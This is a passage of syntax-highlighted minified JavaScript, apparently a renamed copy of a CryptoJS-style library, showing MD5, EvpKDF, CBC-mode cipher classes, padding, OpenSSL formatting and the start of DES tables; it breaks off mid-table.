class="number">0</span>,</span><br><span class="line">            a[<span class="number">3</span>] = a[<span class="number">3</span>] + A | <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">_data</span></span><br><span class="line">              , r = t.<span class="property">words</span></span><br><span class="line">              , n = <span class="number">8</span> * <span class="variable language_">this</span>.<span class="property">_nDataBytes</span></span><br><span class="line">              , i = <span class="number">8</span> * t.<span class="property">sigBytes</span>;</span><br><span class="line">            r[i &gt;&gt;&gt; <span class="number">5</span>] |= <span class="number">128</span> &lt;&lt; <span class="number">24</span> - i % <span class="number">32</span>;</span><br><span class="line">            <span class="keyword">var</span> o = e.<span class="title function_">floor</span>(n / <span class="number">4294967296</span>);</span><br><span class="line">            <span class="keyword">for</span> (r[(i + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>) + <span class="number">15</span>] = <span class="number">16711935</span> &amp; (o &lt;&lt; <span class="number">8</span> | o &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (o &lt;&lt; <span class="number">24</span> | o &gt;&gt;&gt; <span class="number">8</span>),</span><br><span class="line">            r[(i + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>) + <span class="number">14</span>] = <span class="number">16711935</span> &amp; (n &lt;&lt; <span class="number">8</span> | n &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (n &lt;&lt; <span class="number">24</span> | n &gt;&gt;&gt; <span class="number">8</span>),</span><br><span class="line">            t.<span class="property">sigBytes</span> = <span class="number">4</span> * (r.<span class="property">length</span> + <span class="number">1</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>(),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="property">_hash</span>,</span><br><span class="line">            r = t.<span class="property">words</span>,</span><br><span class="line">            n = <span class="number">0</span>; <span class="number">4</span> &gt; n; n++)</span><br><span class="line">                i = r[n],</span><br><span class="line">                r[n] = <span class="number">16711935</span> &amp; (i &lt;&lt; <span class="number">8</span> | i &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (i &lt;&lt; <span class="number">24</span> | i &gt;&gt;&gt; <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = c.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">_hash</span> = <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="title function_">clone</span>(),</span><br><span class="line">            e</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    o.<span class="property">MD5</span> = c.<span class="title function_">_createHelper</span>(a),</span><br><span class="line">    o.<span class="property">HmacMD5</span> = c.<span class="title function_">_createHmacHelper</span>(a)</span><br><span class="line">&#125;(<span class="title class_">Math</span>);</span><br><span class="line"><span class="keyword">var</span> born = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk</span><br><span class="line">      , t = e.<span class="property">lib</span></span><br><span class="line">      , r = t.<span class="property">Base</span></span><br><span class="line">      , n = t.<span class="property">WordArray</span></span><br><span class="line">      , t = e.<span class="property">algo</span></span><br><span class="line">      , i = t.<span class="property">EvpKDF</span> = r.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: r.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">keySize</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="attr">hasher</span>: t.<span class="property">MD5</span>,</span><br><span class="line">            <span class="attr">iterations</span>: <span class="number">1</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(e)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">compute</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">cfg</span>, i = r.<span class="property">hasher</span>.<span class="title function_">create</span>(), o = n.<span class="title function_">create</span>(), a = o.<span class="property">words</span>, s = r.<span class="property">keySize</span>, r = r.<span class="property">iterations</span>; a.<span class="property">length</span> &lt; s; ) &#123;</span><br><span class="line">                c &amp;&amp; i.<span class="title function_">update</span>(c);</span><br><span class="line">                <span class="keyword">var</span> c = i.<span class="title function_">update</span>(e).<span class="title function_">finalize</span>(t);</span><br><span class="line">                i.<span class="title function_">reset</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> l = <span class="number">1</span>; r &gt; l; l++)</span><br><span class="line">                    c = i.<span class="title function_">finalize</span>(c),</span><br><span class="line">                    i.<span class="title function_">reset</span>();</span><br><span class="line">                o.<span class="title function_">concat</span>(c)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> o.<span class="property">sigBytes</span> = <span class="number">4</span> * s,</span><br><span class="line">            o</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    e.<span class="property">EvpKDF</span> = <span class="keyword">function</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> i.<span class="title function_">create</span>(r).<span class="title function_">compute</span>(e, t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">nvl_</span> = <span class="string">&quot;al&quot;</span>,</span><br><span class="line">coypJsDk.<span class="property">lib</span>.<span class="property">Cipher</span> || <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = coypJsDk</span><br><span class="line">      , r = t.<span class="property">lib</span></span><br><span class="line">      , n = r.<span class="property">Base</span></span><br><span class="line">      , i = r.<span class="property">WordArray</span></span><br><span class="line">      , o = r.<span class="property">BufferedBlockAlgorithm</span></span><br><span class="line">      , a = t.<span class="property">enc</span>.<span class="property">Base64</span></span><br><span class="line">      , s = t.<span class="property">algo</span>.<span class="property">EvpKDF</span></span><br><span class="line">      , c = r.<span class="property">Cipher</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: n.<span class="title function_">extend</span>(),</span><br><span class="line">        <span class="attr">createEncryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">create</span>(<span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>, e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">createDecryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">create</span>(<span class="variable language_">this</span>.<span class="property">_DEC_XFORM_MODE</span>, e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(r),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_xformMode</span> = e,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_key</span> = t,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            o.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doReset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">process</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">finalize</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doFinalize</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">_ENC_XFORM_MODE</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">_DEC_XFORM_MODE</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">_createHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r ? d : f).<span class="title function_">encrypt</span>(e, t, r, n)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r ? d : f).<span class="title function_">decrypt</span>(e, t, r, n)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    r.<span class="property">StreamCipher</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">1</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> l = t.<span class="property">mode</span> = &#123;&#125;</span><br><span class="line">      , h = <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = <span class="variable language_">this</span>.<span class="property">_iv</span>;</span><br><span class="line">        i ? <span class="variable language_">this</span>.<span class="property">_iv</span> = e : i = <span class="variable language_">this</span>.<span class="property">_prevBlock</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; n &gt; o; o++)</span><br><span class="line">            t[r + o] ^= i[o]</span><br><span class="line">    &#125;</span><br><span class="line">      , u = (r.<span class="property">BlockCipherMode</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">createEncryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">Encryptor</span>.<span class="title function_">create</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">createDecryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">Decryptor</span>.<span class="title function_">create</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span> = e,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_iv</span> = t</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)).<span class="title function_">extend</span>();</span><br><span class="line">    u.<span class="property">Encryptor</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_cipher</span></span><br><span class="line">              , n = r.<span class="property">blockSize</span>;</span><br><span class="line">            h.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, n),</span><br><span class="line">            r.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_prevBlock</span> = e.<span class="title function_">slice</span>(t, t + n)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    u.<span class="property">Decryptor</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_cipher</span></span><br><span class="line">              , n = r.<span class="property">blockSize</span></span><br><span class="line">              , i = e.<span class="title function_">slice</span>(t, t + n);</span><br><span class="line">            r.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            h.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, n),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_prevBlock</span> = i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    l = l.<span class="property">CBC</span> = u,</span><br><span class="line">    u = (t.<span class="property">pad</span> = &#123;&#125;).<span class="property">Nopk</span> = &#123;</span><br><span class="line">        <span class="attr">pad</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="number">4</span> * t, r = r - e.<span class="property">sigBytes</span> % r, n = r &lt;&lt; <span class="number">24</span> | r &lt;&lt; <span class="number">16</span> | r &lt;&lt; <span class="number">8</span> | r, o = [], a = <span class="number">0</span>; r &gt; a; a += <span class="number">4</span>)</span><br><span class="line">                o.<span class="title function_">push</span>(n);</span><br><span class="line">            r = i.<span class="title function_">create</span>(o, r),</span><br><span class="line">            e.<span class="title function_">concat</span>(r)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">unpad</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            e.<span class="property">sigBytes</span> -= <span class="number">255</span> &amp; e.<span class="property">words</span>[e.<span class="property">sigBytes</span> - <span class="number">1</span> &gt;&gt;&gt; <span class="number">2</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    r.<span class="property">BlockCipher</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: c.<span class="property">cfg</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">mode</span>: l,</span><br><span class="line">            <span class="attr">padding</span>: u</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            c.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">cfg</span></span><br><span class="line">              , t = e.<span class="property">iv</span></span><br><span class="line">              , e = e.<span class="property">mode</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_xformMode</span> == <span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>)</span><br><span class="line">                <span class="keyword">var</span> r = e.<span class="property">createEncryptor</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r = e.<span class="property">createDecryptor</span>,</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_minBufferSize</span> = <span class="number">1</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_mode</span> = r.<span class="title function_">call</span>(e, <span class="variable language_">this</span>, t &amp;&amp; t.<span class="property">words</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doProcessBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_mode</span>.<span class="title function_">processBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="property">padding</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_xformMode</span> == <span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>) &#123;</span><br><span class="line">                e.<span class="title function_">pad</span>(<span class="variable language_">this</span>.<span class="property">_data</span>, <span class="variable language_">this</span>.<span class="property">blockSize</span>);</span><br><span class="line">                <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>)</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                t = <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>),</span><br><span class="line">                e.<span class="title function_">unpad</span>(t);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">4</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> p = r.<span class="property">CipherParams</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">mixIn</span>(e)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">toString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (e || <span class="variable language_">this</span>.<span class="property">formatter</span>).<span class="title function_">stringify</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , l = (t.<span class="property">format</span> = &#123;&#125;).<span class="property">OpenSSL</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">ciphertext</span>;</span><br><span class="line">            <span class="keyword">return</span> e = e.<span class="property">salt</span>,</span><br><span class="line">            (e ? i.<span class="title function_">create</span>([<span class="number">1398893684</span>, <span class="number">1701076831</span>]).<span class="title function_">concat</span>(e).<span class="title function_">concat</span>(t) : t).<span class="title function_">toString</span>(a)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            e = a.<span class="title function_">parse</span>(e);</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1398893684</span> == t[<span class="number">0</span>] &amp;&amp; <span class="number">1701076831</span> == t[<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">var</span> r = i.<span class="title function_">create</span>(t.<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">                t.<span class="title function_">splice</span>(<span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line">                e.<span class="property">sigBytes</span> -= <span class="number">16</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">ciphertext</span>: e,</span><br><span class="line">                <span class="attr">salt</span>: r</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , f = r.<span class="property">SerializableCipher</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">format</span>: l</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n);</span><br><span class="line">            <span class="keyword">var</span> i = e.<span class="title function_">createEncryptor</span>(r, n);</span><br><span class="line">            <span class="keyword">return</span> t = i.<span class="title function_">finalize</span>(t),</span><br><span class="line">            i = i.<span class="property">cfg</span>,</span><br><span class="line">            p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">ciphertext</span>: t,</span><br><span class="line">                <span class="attr">key</span>: r,</span><br><span class="line">                <span class="attr">iv</span>: i.<span class="property">iv</span>,</span><br><span class="line">                <span class="attr">algorithm</span>: e,</span><br><span class="line">                <span class="attr">mode</span>: i.<span class="property">mode</span>,</span><br><span class="line">                <span class="attr">padding</span>: i.<span class="property">padding</span>,</span><br><span class="line">                <span class="attr">blockSize</span>: e.<span class="property">blockSize</span>,</span><br><span class="line">                <span class="attr">formatter</span>: n.<span class="property">format</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="title function_">_parse</span>(t, n.<span class="property">format</span>),</span><br><span class="line">            e.<span class="title function_">createDecryptor</span>(r, n).<span class="title function_">finalize</span>(t.<span class="property">ciphertext</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_parse</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> e ? t.<span class="title function_">parse</span>(e, <span class="variable language_">this</span>) : e</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , t = (t.<span class="property">kdf</span> = &#123;&#125;).<span class="property">OpenSSL</span> = &#123;</span><br><span class="line">        <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n || (n = i.<span class="title function_">random</span>(<span class="number">8</span>)),</span><br><span class="line">            e = s.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">keySize</span>: t + r</span><br><span class="line">            &#125;).<span class="title function_">compute</span>(e, n),</span><br><span class="line">            r = i.<span class="title function_">create</span>(e.<span class="property">words</span>.<span class="title function_">slice</span>(t), <span class="number">4</span> * r),</span><br><span class="line">            e.<span class="property">sigBytes</span> = <span class="number">4</span> * t,</span><br><span class="line">            p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">key</span>: e,</span><br><span class="line">                <span class="attr">iv</span>: r,</span><br><span class="line">                <span class="attr">salt</span>: n</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , d = r.<span class="property">PasswordBasedCipher</span> = f.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: f.<span class="property">cfg</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">kdf</span>: t</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            r = n.<span class="property">kdf</span>.<span class="title function_">execute</span>(r, e.<span class="property">keySize</span>, e.<span class="property">ivSize</span>),</span><br><span class="line">            n.<span class="property">iv</span> = r.<span class="property">iv</span>,</span><br><span class="line">            e = f.<span class="property">encrypt</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, r.<span class="property">key</span>, n),</span><br><span class="line">            e.<span class="title function_">mixIn</span>(r),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="title function_">_parse</span>(t, n.<span class="property">format</span>),</span><br><span class="line">            r = n.<span class="property">kdf</span>.<span class="title function_">execute</span>(r, e.<span class="property">keySize</span>, e.<span class="property">ivSize</span>, t.<span class="property">salt</span>),</span><br><span class="line">            n.<span class="property">iv</span> = r.<span class="property">iv</span>,</span><br><span class="line">            f.<span class="property">decrypt</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, r.<span class="property">key</span>, n)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = (<span class="variable language_">this</span>.<span class="property">_lBlock</span> &gt;&gt;&gt; e ^ <span class="variable language_">this</span>.<span class="property">_rBlock</span>) &amp; t;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_rBlock</span> ^= r,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_lBlock</span> ^= r &lt;&lt; e</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = (<span class="variable language_">this</span>.<span class="property">_rBlock</span> &gt;&gt;&gt; e ^ <span class="variable language_">this</span>.<span class="property">_lBlock</span>) &amp; t;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_lBlock</span> ^= r,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_rBlock</span> ^= r &lt;&lt; e</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> r = coypJsDk</span><br><span class="line">      , n = r.<span class="property">lib</span></span><br><span class="line">      , i = n.<span class="property">WordArray</span></span><br><span class="line">      , n = n.<span class="property">BlockCipher</span></span><br><span class="line">      , o = r.<span class="property">algo</span></span><br><span class="line">      , a = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">      , s = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">      , c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>]</span><br><span class="line">      , l = [&#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span 